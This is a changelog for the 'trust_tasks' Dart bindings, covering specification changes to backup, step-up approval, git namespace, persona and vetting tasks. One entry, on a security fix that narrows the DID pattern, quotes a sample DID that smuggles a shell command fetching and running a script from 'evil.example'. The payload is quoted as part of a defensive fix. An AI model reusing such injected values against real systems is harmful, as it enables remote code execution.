# Changelog — `trust_tasks`

All notable changes to the Dart bindings package.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
The package versions over **its own API** — what a consumer compiles against —
not over `SPEC.md`. Below 1.0 a breaking change bumps the leading non-zero
component.

Publishing is triggered by the `trust-tasks-dart-v<version>` tag, because
pub.dev only accepts an automated publish from a tag-triggered workflow. See
`RELEASING.md`.

## 0.2.8 — 2026-09-24


### Added

- **backup**: A node-neutral backup and restore family (#633)

`vta/backup/*` is the agent's descriptor-based backup and restore: a slot,
  digests pre-committed before any byte moves, the bundle carried either as an
  HTTPS stream or chunk by chunk over the agent's own Trust Task transport, and a
  finalize step that previews before it replaces. Nothing in that transfer is
  specific to an agent, and a community node needs exactly the same thing for the
  same reason: a backup of any real node is too large for one document, and a
  node that bounds a document's size before checking its proof — as it must on a
  binding that authenticates no sender — cannot accept one that way.
  `vtc/backup/import/0.1`, which carries the whole envelope inline, is the case
  in point.

  This adds `backup/{initiate-export, get-chunk, complete-export,
  initiate-import, put-chunk, finalize-import, abort}/0.1`, derived from the
  latest `vta/backup/*` versions and made node-neutral:

  - The parties, prose and error-code slugs name a node rather than an agent.
  - What a backup contains is the node's to define. `finalize-import`'s
    response replaces the agent-specific `keyCount` / `aclCount` /
    `contextCount` / `auditCount` / `importedSecretCount` with one `counts` map
    keyed by the node's own record kinds — an agent's `keys`, `acl`, `contexts`,
    `audit`, `importedSecrets`; a community's backed-up keyspaces — still
    counts, never contents.
  - The transfer shapes (descriptor, chunk manifest, chunk data, bundle id) are
    referenced from `vta/_shared/0.1/backup-transfer` rather than copied. A copy
    with the node-neutral wording would have been a second definition that the
    TypeScript generator disambiguates by renaming the published `ChunkData`,
    `ChunkSize`, `ChunkManifest`, `ChunkedDescriptor` and `BundleDescriptor`
    exports — a break for every TS consumer, for no difference on the wire.
  - The "Changes from 1.0" history sections are dropped; a new 0.1 has no
    predecessor, and the abstract says where the family came from.

  `vta/backup/*` stays served while agents adopt this family, and
  `vtc/backup/{export,import}` remain for a node small enough to fit one
  document. Retiring the agent-specific versions is a later change.

  Bindings regenerated for Rust, TypeScript, Go and Dart; the only change to
  existing generated code is the new `backup` feature and index entries.



### Specifications

- **auth/step-up**: A step-up bound to one operation needs no session (#631)

`approve-response/0.3` introduced the bound approval — one that authorizes a
  single operation and elevates nothing, answered `recorded` — but
  `approve-request` still required a `sessionId`, and `approve-response` echoed
  one. So the only operations a step-up could be bound to were ones that arrived
  over a session.

  An operation that arrives as a signed Trust Task document has none: its
  authority is its proof. Binding the human's gesture to one of their sessions
  after the fact cannot say which, and a window opened on any of them is one a
  process holding the signer's key can spend on acts the human never saw — the
  same defect as a session elevation standing in for consent.

  - `approve-request/0.3`: `sessionId` is omitted for a step-up bound to an
    operation that arrived without a session, and a relying party MUST NOT fill
    it with a session it chose after the fact. A new `boundTo` names the bound
    operation — for a signed document, a digest of its type and payload salted
    with the challenge, since an unsalted digest over a short, predictable
    payload is a confirmation oracle. A new "Inline delivery" section lets a
    relying party with no push channel carry the request in the refusal of the
    operation it is for (`details.stepUpRequest`); it is authenticated by being
    the relying party's own reply, so a producer must not surface one received
    any other way, and it is for bound step-ups only. The four Security &
    Privacy sub-headings are added.
  - `approve-response/0.4`: `sessionId` is echoed exactly when the request
    carried one, and a response carrying one for a session-less step-up is
    refused (`subjectMismatch`), so a bound approval cannot be read as naming a
    session to elevate. The subject is compared with the subject bound to the
    pending step-up rather than with a session's.

  Both are backward-compatible minors: a required member became optional and an
  optional one was added. Motivated by the community node's signed-document
  step-up (OpenVTC/verifiable-trust-infrastructure#1713) and by
  trustoverip/dtgwg-vti-spec#40, which amends VTI-APV-003 to admit it.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.2.7 — 2026-09-24


### Added

- **git-ns**: Hold every DID to the W3C DID Core syntax (#629)

The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
  anything without whitespace after the method: shell metacharacters,
  quotes, backticks, `/`, `?` and `#`. A security review found that
  `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
  right's subject and later reached a copyable shell command in an admin
  UI.

  git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
  `did:`, a lowercase method name, and a method-specific id of
  colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
  octets, the last one non-empty. No path, query or fragment: every
  member typed `Did` names a party (subjects, owners, grantedBy, a
  transfer's `to`, a job's subjects), never a verification method. No
  other definition changes, and no DID-URL field in the family uses
  `Did`. The framework defines no DID pattern to reuse; issuer and
  recipient are unconstrained VIDs.

  Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
  schema component to be a new component version, so _shared/0.1 and
  0.2 are untouched. Item 3 couples adoption to a new version of each
  consuming specification, and the in-place rule of 5.2 covers only
  re-pins with no wire effect, so each latest spec version that carries
  a `Did` gets a new version. They are all draft, so the breaking
  narrowing ships as a MINOR increment under the draft allowance of 5.2:

    view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
    repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
    repo/transfer 0.2, right/grant 0.2, right/revoke 0.2

  Each restates its predecessor with a "Changes from" section, pins
  _shared/0.3, and links to the newest versions of its siblings. The
  specs that carry no `Did` (account/*, bridge/event, bridge/result,
  namespace/bind, namespace/unbind) are unchanged.

  The six specs with a `Did` in the request gain invalid examples: shell
  metacharacters, whitespace, a `#` fragment and an uppercase method
  (and, for bridge/job, a bad `desiredRoles[].subject`).

  Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
  the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
  exist in two shapes and take family/version-qualified names
  (`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
  still exports them under their own names.

## 0.2.6 — 2026-09-24


### Added

- **git-ns/bridge/event**: Detach on transfer and name reuse, confine events to their namespace (#627)

git-ns/bridge/event 0.2. The wire format is unchanged. What the VTC does
  with three kinds of event changes:

  - repoTransferred always detaches the repository and withdraws its
    rights, wherever `to` is -- another owner, another forge, or another
    namespace, even one the same VTC governs. Rights never move. 0.1
    handled a transfer into a bound namespace as a rename, which let a
    forge-side act hand the receiving namespace's admins owners and
    committers they never chose. The receiving namespace sees the
    repository as repoCreatedUnmanaged, and its admins adopt it and grant
    afresh. Renames within the namespace are unchanged.
  - repoCreatedUnmanaged at a governed name whose forge id differs from
    the recorded one detaches the old repository first (name reuse), so
    the newcomer inherits nothing.
  - Every resource an event names (resource, from, a rename's to, drift
    items) must lie inside the event's namespace, else permissionDenied.
    The one exception is a transfer's `to`: it says where the repository
    went, and nothing is done there.

  drift/resolve 0.1 and bridge/job 0.2 now link to event 0.2. Bindings
  regenerated for Rust, TypeScript, Go and Dart.

## 0.2.5 — 2026-09-24


### Added

- **git-ns**: Drift resolution, namespace reseat, linked accounts in view (#625)

Three follow-ups to the git-ns family. Released versions are untouched;
  every change is a new version folder or a new task.

  - git-ns/view 0.2: the response also carries `accounts`, the forge
    accounts linked to the caller's own DID (ForgeAccount + linkedAt),
    never another member's; narrowed to the resource's forge when
    `resource` is given. Required, empty when none. Everything else is
    restated unchanged from 0.1.

  - git-ns/drift/resolve 0.1 (new): an owner of a repository, explicit or
    implied (so namespace admins too), resolves one reported drift item.
    Drift items have no stable id -- they are recomputed and replaced
    wholesale by every bridge event -- so the item is selected by type,
    plus the account for the three role types (at most one role item per
    account per repository), plus an `observed` guard, required for adopt.
    `adopt` records the right the observed role projects to, evaluated
    exactly as git-ns/right/grant (fixed rules, policy, idempotence);
    refused with accountNotLinked when the account has no member, and
    notAdoptable / noMatchingRight where no right fits. `revert` sends the
    bridge the job that restores the projection.

  - git-ns/bridge/job 0.2: projectRoles gains `removeAccounts`. 0.1 only
    converges roles the bridge manages and reports other roles as drift
    without removing them, so it cannot revert a collaborator added on
    the forge. The rest of the revert table reuses 0.1 jobs.

  - git-ns/namespace/reseat 0.1 (new): a community administrator grants
    git.ns.admin on a headless namespace (no live, unexpired, member-held
    git.ns.admin record) to a current member, with a required audit
    statement. Destructive class; refused with notHeadless otherwise. It
    also states that expiring git.ns.admin records do not count toward
    the last-admin invariant. That rule lives here and is not a new
    right/grant version: 0.1 says nothing about expiring records, so no
    valid document changes meaning.

  - git-ns/_shared 0.2: adds DriftType, the value set a drift selector
    shares with DriftItem.type. DriftItem keeps its inline list so it is
    textually identical to 0.1. That keeps the TypeScript component
    hoisting additive: renaming SharedComponents.DriftItem would have
    been a break.

  The spec forbids declaring consent classes (SPEC 7.3 item 13), so the
  "elevated" impact of reverting an owner-level role is written as a
  consequence and as descriptive impact prose in drift/resolve.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.2.4 — 2026-09-23


### Fixed

- **git-ns/right/grant**: Publish the implied commit right of a namespace admin (#623)

A namespace admin implies ownership of every repository in the namespace,
  and so git.commit.sign on each, but the projection rule named only own and
  maintain records: an admin's commits would have failed every check. The
  VTC now publishes the admin's git.commit.sign on the namespace resource,
  and a bridge that sets up a check configures the namespace as its
  fallback resource so that record counts.

## 0.2.3 — 2026-09-23


### Added

- **git-ns**: Add the git namespaces specification family (#621)

* feat(git-ns): add the git namespaces specification family

  A VTC can say today that a DID may sign commits for an org or a repo, and
  nothing else about git: who owns a repository, who may create one, who may
  merge and who may grant commit rights all live on the forge, and drift from
  the VTC as soon as someone clicks a button. git-ns makes the VTC the source of
  truth for all of it. Rights are per resource, not per role; the Trust Registry
  is the published projection verifiers read, and the forge is the enforced one.

  Five rights, spelled as the TRQP actions the VTC publishes them under:
  git.ns.admin, git.repo.create, git.repo.own, git.repo.maintain and
  git.commit.sign. Resources are forge-qualified and lowercase
  (github.com/acme/widgets, codeberg.org/acme), so a right never crosses forges
  and a community can host where it likes.

  Member- and admin-facing tasks, addressed to the VTC:

  - git-ns/namespace/bind, git-ns/namespace/unbind
  - git-ns/repo/create, git-ns/repo/adopt, git-ns/repo/transfer,
    git-ns/repo/archive
  - git-ns/right/grant, git-ns/right/revoke
  - git-ns/view
  - git-ns/account/link, git-ns/account/link-status

  git-ns/right/grant carries the family's rights model: implied rights, the
  grant-authority table, and six fixed rules a VTC enforces in its own code
  before policy runs, which policy can narrow and never loosen: scope
  containment, no escalation, the last-owner invariant, a last-admin invariant,
  the members-only floor for namespace rights, and policy-may-only-narrow. Each
  refusal has its own error code, declared once at the family level (git-ns:*).

  VTC <-> bridge tasks, for the per-community service that holds the forge
  credentials and the forge adapters:

  - git-ns/bridge/job — seven convergent, forge-neutral job kinds
  - git-ns/bridge/result — exactly one per job, per-step outcomes
  - git-ns/bridge/event — nine forge-neutral event types plus drift

  Shared shapes (resources, namespaces, RepoSummary, RightRecord, drift) live in
  git-ns/_shared/0.1.

  Bindings regenerated for Rust, TypeScript, Go and Dart; conformance checks
  agree. trust-tasks-rs gains a git-ns feature, in all-specs.

## 0.2.2 — 2026-09-23


### Added

- **vtc/vetting/vetters/event-mode**: The exception to the constant drip (#620)

A vetter's ordinary rate is a few tokens a tick, whether or not they have
  vetted anyone. That is the right rate for ordinary weeks and the wrong one for
  a conference desk, and the answer is deliberately not a bigger drip under the
  same key: it is a separate token label for a named event, with its own rate,
  its own expiry, and a group of vetters large enough that a spend under it still
  hides one.

  This task carries the vetter's half of that, which is only ever a request. The
  approval is an act by someone else, through the community's own administrative
  surface, and the specification says why there is no Trust Task for it: a task
  the vetter could send is a task a vetter could be made to send.

  The response says where the request stands, and carries a group *count* rather
  than a group. Who else is at the event is the anonymity set, so the number is
  the most a member may be told — enough to tell "nobody has approved it" from
  "not enough people have asked", which are the two reasons a request waits.

- **vetting/attestation**: The four tasks hidden-vetter admission needs (#618)

* feat(vetting/attestation): the four tasks hidden-vetter admission needs

  A community can hide which of its vetters vetted an applicant: the vetter
  attests under a blind class credential, the applicant proves that k distinct
  holders of one attested it, and the community counts the proof with the rule
  it already counts named statements with. What was missing was the wire.

  Four specifications, and the split between them is the design:

  - vtc/vetting/vetters/pcs-root — a vetter enrols for a class label. The
    community checks its own records (a live vetter grant, no credential under
    this label yet, the identifier it was bound to) and signs a commitment it
    cannot open. Being named happens here, once per label, and nowhere else on
    the path.
  - vtc/vetting/vetters/pcs-tokens — the vetter draws its tick of attestation
    tokens, unconditionally and at a published rate. A draw that tracked demand
    would report activity, which is what the exchange exists to hide; the quota
    is the community's to enforce, never the asker's restraint.
  - vetting/attestation — vetter to applicant, carrying the facts of the session
    and no issuer. The delivering identity is deliberately NOT what makes it
    count, and a consumer is told not to record it beside the attestation: that
    would recreate, in the applicant's own store, the link the exchange removes.
  - vtc/vetting/pcs-challenge — the applicant asks the community for the
    single-use nonce its proof must bind. Without it a proof verifies as often
    as it is submitted, and the second submission counts as readily as the first.

  vetting/attestation declares identifierScope: any. Nothing in it needs a
  reusable identifier — the community never sees the document, and the applicant
  only needs the identifier the session was held under — so a pair that runs the
  whole vetting exchange pairwise loses nothing.

  Bindings regenerated for all four languages; conformance checks agree.

## 0.2.1 — 2026-09-23


### Added

- **persona**: Attribute/get — read one attribute, by identifier (#616)

The family had no narrow read, and the shape of the workaround is the
  argument for the task. A client revealing one value called
  `persona/attribute/list` with a `typePrefix` and `includeValues`, then
  filtered to the id it already held — so showing one email address
  decrypted and returned every email address the holder has, and the audit
  trail recorded a listing of the pool rather than a decision about one
  fact.

  - Values are withheld unless asked for, and a `sensitivity: high` value
    needs a second flag, on the same two-step as `attribute/list`. A
    withheld value is stated (`valueWithheld`), never left to inference: a
    consumer reading an absent value as "there is none" shows the holder an
    empty field where their passport number is.
  - `version` reads a retained earlier version, which is what makes "what
    did I show them in March" answerable — a disclosure record and a pinned
    entry both name one. A purged version is `versionPurged`, never a
    silent fall back to the current value.
  - `retainedVersions` names the versions still held, so a holder deciding
    whether to purge can see what purging would take away rather than being
    asked to make an irreversible decision blind.

  One identifier, never a list: a maintainer that accepted several would
  recreate the enumeration the task exists to avoid, one call later.

## 0.2.0 — 2026-09-23

## 0.1.19 — 2026-09-23


### Added

- **vtc/vetting/vetters/show**: A by-DID vetter status lookup (#603)

* feat(vtc/vetting/vetters/show): a by-DID vetter status lookup

  The vetter listing omits a vetter with no published profile and one whose
  grant was revoked in exactly the same way: both are simply absent. So an
  applicant whose vetter has gone quiet cannot tell which happened, and a
  vetter cannot check their own standing at all. The only way to find out
  today is to read the grant credential's status list, which needs the
  credential in hand.

  `vtc/vetting/vetters/show/0.1` answers by DID with one of `live`, `revoked`,
  `expired` or `none`, plus the grant id, the timestamp that ended or will end
  it, and — for a live grant — whether the vetter is listed, which is what
  separates "unlisted by choice" from "not a vetter".

  A new task rather than a `status` member on the listing response: adding a
  member to an existing response breaks consumers that reject unknown members,
  and the two answer different questions.

  `revoked` outranks `expired` where both hold, because withdrawal and lapse
  are different statements. `none` deliberately does not distinguish a
  non-member from a member who is not a vetter — the caller asked about
  vetting — and the revocation reason is not carried at all, including through
  `ext`.

  Rust, TypeScript and Go bindings regenerated.

## 0.1.18 — 2026-09-22


### Added

- **specs**: Add the ExtCritical framework def, and open vetting requirements to ext (#600)

A community publishing an admission mode the join manifest does not
  enumerate has had two options: put the parameters in an undeclared
  member of `vetting` and watch them vanish, or wait for a version of the
  manifest that names them. This adds the third.

  framework 0.4 (specs/_framework/0.4/framework.schema.json)
    Additive over 0.3: `Ext` and `DigestMultibase` carried forward
    unchanged, `ExtCritical` new — the array naming the `ext` namespaces
    a consumer must understand or refuse, per the framework change in
    trustoverip/dtgwg-trust-tasks-spec#23. Neither rule it carries is
    checkable by JSON Schema: that an entry names a namespace present in
    the sibling `ext` is checkable only against that sibling, and whether
    a namespace is load-bearing is not a schema question. The $def says
    so, and both are consumer-side checks.

  vtc/join-requests/manifest 0.2 (draft, edited in place per SPEC §5.2)
    `vetting` gains `ext` and `extCritical`, and this draft's framework
    $refs re-pin from 0.2 to 0.4, errata-style.

    `vetting` was already `additionalProperties: true`, so an undeclared
    member always validated. Validating is not arriving: a generated type
    names the members the schema declares and drops the rest, so the
    member was parsed and discarded, and discarded again on the
    re-serialization `requirementsDigest` is computed over — a reader
    recomputing the digest from what it parsed got a value that did not
    match what it was sent. A declared member survives both.

    A new response example shows a criterion carrying hidden-vetting
    parameters under a namespace it controls, marked critical because an
    applicant that ignored it would gather named statements and present
    them to a criterion whose purpose is that it never receives them. Its
    `requirementsDigest` is the real value for the criterion as printed.

  Generated bindings regenerated: 472 specs across TypeScript, Rust, Go
  and Dart all agree. `npm run validate` passes 472 specs; the manifest's
  validate-gated fixtures run 5 tests; `cargo test --workspace` is 927.



### Documentation

- **specs**: Sign examples with eddsa-jcs-2022 (#599)

* docs(specs): sign examples with eddsa-jcs-2022

  30 draft specifications' examples carried "cryptosuite":
  "eddsa-rdfc-2022", while the reference ecosystem signs with
  eddsa-jcs-2022. Both suites are conformant, but implementers copy
  examples, and the two canonicalize differently. Raised by NAOMS against
  acl/change-role/0.1 (framework spec PR #21 makes the same fix to the
  framework's own examples).

  Editorial, made in place per CONTRIBUTING-SPECS: examples only, no
  schema or wire change, no version folder. The 20 retired specifications
  that carry the same example are frozen (SPEC §6.4) and left as they are.

## 0.1.17 — 2026-09-22


### Added

- **persona**: Wear a face without naming a persona DID (#589)

Design note (VTI docs/05-design-notes/persona-context-first.md) §9.7: a
  holder should say "wear this face here", not bring a DID.

## 0.1.16 — 2026-09-22


### Added

- **persona**: Derived provenance, and endorsements as inventory (#582)

Design note (VTI docs/05-design-notes/persona-context-first.md) §5.7.

  Provenance gains `derived` {source, derivedAt}: a value taken from a
  source the holder connected or supplied — a code-hosting profile, an
  uploaded CV — that the holder did not type and no issuer signed. It is
  the holder's claim that the source said so, and a consumer must not
  present it as attested. `source` names the KIND of source (`github`,
  `cvUpload`), never a handle or URL: provenance reaches the verifier, and
  a handle there would disclose an identifier the holder never chose to
  share. For how strongly a disclosed value identifies the holder the
  kinds rank credentialBacked > derived > selfAsserted. The preview's
  provenance enum gains `derived`.

  Attribute gains `endorsements`: vault ids of credentials in which a
  third party endorses the value. Inventory, not evidence — a vouched
  self-assertion is still self-asserted, and folding a vouch into
  provenance would render it as attested. Not disclosed with the value.
  attribute/put takes it and refuses an id the vault does not hold
  (`endorsementNotFound`).

- **spec**: Vtc/invitations/deliver/0.1 — get an invitation to the DID it admits (#581)

Keyring VTI-21 and VTI-32. `vtc/invitations/issue` returns the signed
  invitation to the inviter once, and nothing carried it further: an
  invitee was reached only by whatever the inviter improvised, and the
  credential is too large for a QR code.

  This task delivers an issued invitation over the credential-exchange
  family the framework already has. On `message` the community sends a
  `credential-exchange/offer` to the invited DID over a transport it
  advertises (`noRoute` if none); on `offer` it returns the OID4VCI offer
  for the inviter to hand over — small, because it names the credential
  rather than containing it. Either way the invitee redeems with
  `credential-exchange/request`, and the credential is released only for a
  key-binding proof by the invited DID's key, so a photographed QR code
  admits no one else. At most one offer per invitation is live; the
  invitation credential never appears in this task's response.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.1.15 — 2026-09-22


### Added

- **persona**: Where a face may be worn, where it is, and what it has done (#577)

* feat(persona): where a face may be worn, where it is, and what it has done

  Design note (VTI docs/05-design-notes/persona-context-first.md) §5.4 and
  §9.6, and `until` on compose.

  FaceReach — a pool face may carry `reach`: `{kind: anywhere}` (the
  default, and what absent means) or `{kind: only, contextIds: [...]}`.
  binding/set refuses to wear a face outside it (`outsideReach`), and
  profile/put refuses to narrow it past a context the face is worn in now
  (`boundOutsideReach`, naming them). A tagged object rather than a bare
  context list, so "unrestricted" and "nowhere" cannot be confused: `only`
  needs at least one context, and nowhere is a retired face.

  persona/profile/usage/1.0 — where one face is worn now, with each
  binding's `until` and the face's reach beside them. Holder-only: it is
  the map of which personas are one face.

  persona/profile/timeline/1.0 — one face's history joined, oldest first:
  composed, worn, unworn, expired, disclosed, valueChanged, promoted,
  retired, reinstated. Never a value and never a private label. A
  maintainer records from now on what it would not otherwise keep — a
  binding taken off leaves no trace in the one that replaces it — and may
  omit what happened before and left no record.

  profile/compose takes `until`, for the face composed at the door of a
  conference; `untilNotFuture` refuses one in the past or without a
  personaDid.

## 0.1.14 — 2026-09-21


### Added

- **trust-task-discovery**: Publish 0.2 with a three-part frameworkVersion (#571)

trust-task-discovery/0.1's response admits frameworkVersion only as
  MAJOR.MINOR, so a responder cannot advertise a framework release as the
  framework has written it since 0.4.0 (SPEC §5.1.1) — 0.6.0, or a later
  PATCH. Widening 0.1 in place would make every 0.1 discoverer that
  validates the response reject a conforming one, so this is 0.2.

  - specs/trust-task-discovery/0.2: identical to 0.1 except the response's
    frameworkVersion is MAJOR.MINOR.PATCH; adds "Relationship to 0.1"
    (answer each version in the version asked; discoverers SHOULD ask 0.2)
    and the four Security & Privacy sub-sections. Bindings generated.
  - trust-tasks-rs: DiscoveryRegistry::respond_to_v0_2; the configured
    release is held three-part and written MAJOR.MINOR in a 0.1 response.
    Default "0.2" (stale) -> "0.6.0".
  - trust-tasks-https: with_discovery/enable_discovery answer both 0.1 and
    0.2, and advertise both.
  - trust-tasks-dart-https: enableDiscovery answers both versions; default
    frameworkVersion '0.5' -> '0.6.0'; example asks in 0.2.

- **persona**: Retire a face, warn before deleting one, and let a binding end on its own (#570)

Removing a face means one of three things to the person doing it, and
  the family had tasks for two: "not here" (a null binding/set) and "gone"
  (profile/delete). This adds the middle one.

  persona/profile/retire/1.0 — stop being a face everywhere and keep it.
  Every binding to it is cleared and reported, it drops out of pickers and
  default listings (profile/list `includeRetired`), and binding/set and
  local/binding/set refuse it (`profileRetired`). Values and disclosure
  history are kept. persona/profile/reinstate/1.0 undoes it and binds
  nothing: wearing a face in a context is decided in that context.
  Profile gains `status` and `retiredAt`.

  profile/get and profile/delete return `disclosedTo` {partyCount,
  contextCount}, and the delete spec tells a producer to show it before
  sending: deleting a face does not un-tell anyone.

  binding/set and local/binding/set take `until`; binding/get and
  binding/list return it. At expiry the binding clears and, when the face
  is then worn nowhere, it is retired — never deleted, and never retired
  while another context still wears it. `untilNotFuture` refuses a past
  `until` or one with a null profileId.

## 0.1.13 — 2026-09-21

## 0.1.12 — 2026-09-21


### Added

- **messaging**: Add mediator queue, message, stats and traffic-monitor specifications (#549)

Ten new messaging/* tasks (all 0.1, draft) so a mediator can be operated
  entirely through Trust Tasks — by an administrator across every account, or
  by an account controller over its own queues — instead of the REST
  `/admin/status`, `/purge` and `/queue/status` routes and the retired DIDComm
  admin protocols.



### Other

- Declare outcome evidence for witness/session and vetting/session (#550)

Implements framework §7.3 item 20 in the registry
(trustoverip/dtgwg-trust-tasks-spec#15 and #17).

- spec.meta.schema.json: optional `outcomeEvidence` key (response Type
  URI, binding by id + task digest or by fresh challenge, rationale).
  Excluded from every binding generator, so no codegen change.
- build-registry: checkOutcomeEvidence fails the build when the declared
  response is missing, lacks a response payload, or does not require
  proof and issuedAt (20.1-20.3); when the initiating spec is bearer or
  has no REQUIRED recipient; or when a binding pointer names an
  undeclared payload member (20.5). Warns when retention is not durable.
- witness/session/0.1 declares witness/session/submit#response, bound
  by the VWC's taskContext and taskDigestMultibase.
- vetting/session/0.1 declares its own #response, bound by the card's
  challenge; permitted under 20.5.2 because the statement's issuer is
  the session's issuer.
- witness/session/submit/0.1 cites SPEC §4.9.4 instead of its own
  pairing rule, keeping only the witnessing-specific checks.
- SPEC.md mirror: §4.9.4, §7.3 item 20, the outcome-evidence term, the
  §10 correlator paragraph and the [VTI] reference, ported from the
  canonical repo.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

## 0.1.11 — 2026-09-21


### Added

- **vtc**: A community can ask an applicant to tell it about themselves (#543)

From the persona context-first design note (verifiable-trust-infrastructure,
  docs/05-design-notes/persona-context-first.md §5.2): a join manifest could
  ask only for credentials, so a community wanting a display name and a
  country had nothing to put on the "what's required" screen, and nothing
  connected the join ceremony to the applicant's persona.

  All additive, no new versions:

  - vtc/join-requests/manifest/0.2: optional `requestedAttributes` --
    claim types (never values), each `required` (default true) with a
    `purpose` shown to the applicant. Outside every criterion, so no
    requirementsDigest covers it. Answers are self-asserted: a community
    MUST NOT describe one as verified or decide as if it were; a community
    needing an attested value asks for a credential instead.
  - vtc/join-requests/submit/0.2: optional `attributes` -- [{type, value}],
    bound to the applicant by the document proof. New codes
    attributesMissing (a required one is absent) and attributesUnrequested
    (a type the manifest does not request -- refused rather than stored, so
    an over-sharing client cannot leave data with a community that never
    asked). SHOULD be sent through the applicant's own disclosure path so
    their record of what they told whom includes it.
  - vtc/_shared JoinRequest: optional `attributes`, so show and list carry
    the answers to reviewers, as the applicant's own statement.

  Bindings regenerated in Rust, TS, Go and Dart.

## 0.1.10 — 2026-09-21


### Added

- **persona**: Honest pins, purge-version, and entry slots (#538)

## 0.1.9 — 2026-09-21


### Specifications

- **persona**: Lifecycle answers — disclosure currency, edit reach, binding label (#533)

Additive members on existing 1.0 schemas, plus normative prose. From the
  persona context-first design note (verifiable-trust-infrastructure,
  docs/05-design-notes/persona-context-first.md, sections 3.2, 3.4, 9.2, 9.3).

## 0.1.8 — 2026-09-21


### Specifications

- **vtc/join-requests/supplement**: Vetting travels in the presentation, so it is replaced with it (#531)

#526 stated that vetting attestations are "attached to the request, not to the
  presentation", and that a consumer MUST NOT discard them when the presentation
  is replaced. That is wrong, and I found it while implementing the consumer
  side.

  A community counts vetting by reading the attestations **out of the
  presentation** it was handed — in the reference implementation,
  `vetting_credentials(vp)` filters the VP's `verifiableCredential` array. The
  per-request vetting record that does exist is a *record*: it answers the admin
  view, the vetter sweep, and the question of which admissions a later-withdrawn
  statement counted toward. No decision reads it. So there is nothing on the
  request for a consumer to decline to discard, and a supplement whose
  presentation omits the attestations is one with no vetting.

  The claim was also internally inconsistent with the rule immediately above it.
  Carrying forward attestations from a superseded presentation is accumulation —
  it decides the request on evidence the applicant is no longer presenting, which
  is exactly the defect the replace-not-merge rule exists to prevent. It merely
  arrives by a different route, so the corrected text forbids it explicitly.

  What survives is the promise underneath, which is the part that mattered: a
  vetting attestation is a credential the **applicant** holds, so re-presenting
  it costs the vetter nothing and no one attests twice. The obligation this puts
  on a deferring community is now stated — name the attestations in the
  `presentationDefinition` alongside everything else required.

  The Correlation subsection carried the same error ("it is what lets vetting
  survive") and is corrected to what the linkage actually buys: the applicant
  keeps their place rather than starting again.

  Prose only, in place, per SPEC §5.2's draft rule — no schema change, so the
  bindings are untouched.

## 0.1.7 — 2026-09-21


### Added

- **vtc/join-requests/supplement**: Let a deferred applicant answer, instead of starting over (#526)

Keyring finding KR-03, the half not closed by `join-requests/withdraw/0.1`
  (#518). A community that cannot decide a request on what it was given defers it
  and says what more it needs — and until now the applicant had nowhere to put
  the answer. The request stays open, `join-requests/submit`'s dedup rule refuses
  a second application, and the only ways out are to withdraw (discarding the
  vetting already gathered) or to wait for a retention sweep neither party
  controls. A deferral was a dead end dressed as a question.

  This task is the answer: the applicant re-presents against the request that
  already exists, the community re-runs its admission policy, and returns a fresh
  verdict.

  ## The response is submit's response

  `{requestId, verdict}` over the shared `Verdict`, exactly as
  `join-requests/submit/0.2` returns. A supplement has precisely the outcomes a
  submission has — including a further `requestMore`, because the community is
  entitled to still not be satisfied, and including `deny` — so a client that can
  read one reads the other with no second code path.

  ## Three decisions that had a tempting wrong answer

  **The presentation replaces, it does not accumulate.** Merging a new
  presentation with the old one produces a claim set the applicant never
  presented and never signed as a whole, covered by no single proof; a consumer
  could not then say what the applicant actually asserted at the moment it
  admitted them. The cost is that the applicant re-presents everything rather
  than only the shortfall, so the spec tells a deferring community to describe
  the whole requirement in its `presentationDefinition`.

  **Replacement governs the presentation and nothing else.** Vetting attestations
  are attached to the request, not to the presentation, and a consumer MUST NOT
  discard them when the presentation is replaced. A vetter who has already
  attested does not attest again because the applicant answered a question about
  a credential. This is what makes supplementing meaningfully different from
  withdraw-and-resubmit, which throws that work away.

  **A merely-queued request cannot be supplemented** — `notAwaitingEvidence`, a
  precondition and not an authorization rule. A `refer`red request waits on the
  community, not on the applicant; accepting new evidence into it would replace
  what a maintainer is reviewing underneath them, leaving the document they were
  reading no longer the one they were asked to decide. An applicant who wants to
  change a request nobody asked them to change withdraws and submits afresh,
  which is visible to everyone.

  ## Other declarations

  Authorization is ownership, as on withdraw: the proven issuer must be the
  applicant on the request, which is the whole entitlement because an applicant
  holds no membership or capability. `notFound` covers both "no open request" and
  "not yours", so the task cannot be used to probe which request ids exist.

  `issuedAt` is REQUIRED because a supplement is replayable in a way a submission
  is not: the request it targets outlives it, so a replay re-runs the policy
  against evidence the applicant has since replaced and can overwrite a newer
  verdict with an older one.

## 0.1.6 — 2026-09-20


### Specifications

- **vtc/endorsement-types/delete**: A criterion requiring the type also blocks its deletion (#523)

The spec described one kind of reference — a live endorsement — and the
  `inUse` refusal as being about orphaned endorsements alone. A second kind
  exists wherever the consumer also holds admission criteria: a criterion
  requiring statements of the type is left asking applicants for evidence the
  community no longer recognises. Where registering such a criterion against
  an unregistered type is itself refused, deleting the type strands the
  criterion in a state it could not have been created in.

  `inUse` now covers both, and gains a `detailsSchema` so a consumer that can
  determine both reports which applies rather than leaving the caller to
  parse prose. `liveEndorsements` and `criteria` are each optional, because
  neither an endorsement store nor a criteria registry is mandatory — and the
  spec says plainly that an absent member means "not applicable here", not
  "none found", so a caller cannot read silence as an all-clear.

  Conformance asks a consumer that can determine both to gather both before
  refusing. Refusing on the first found turns one determination into as many
  round trips as there are kinds of reference, each ending in the same code.

  Security & Privacy gains what the refusal discloses: `details` names
  criteria by identifier, which is a governance fact the authorised
  administrator can already enumerate, and is reachable only after the
  community-admin capability has been verified.

  In place on 0.1 rather than a new version: the spec is `draft`, no payload
  or response shape changes, and no previously-valid document becomes
  invalid.

  Implemented in verifiable-trust-infrastructure#1584, which added the
